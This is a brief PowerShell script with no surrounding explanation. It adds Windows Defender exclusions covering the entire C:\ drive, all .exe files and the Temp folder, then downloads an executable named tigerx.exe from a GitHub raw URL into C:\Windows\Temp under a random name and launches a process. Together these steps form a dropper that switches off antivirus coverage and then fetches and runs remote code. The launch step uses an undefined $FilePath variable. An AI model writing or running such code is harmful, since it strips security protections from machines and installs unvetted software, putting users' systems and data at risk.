$rand = Get-Random -Maximum 99999999
Add-MpPreference -ExclusionPath "C:\",".exe","C:\Windows\Temp\"
$url = "https://github.com/Pctoolsbox/tigerx/raw/refs/heads/main/tigerx.exe"
$outpath = "C:\Windows\Temp\tigerx_$rand.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $outpath)
$args = @("Comma","Separated","Arguments")
Start-Process $FilePath -ArgumentList $args
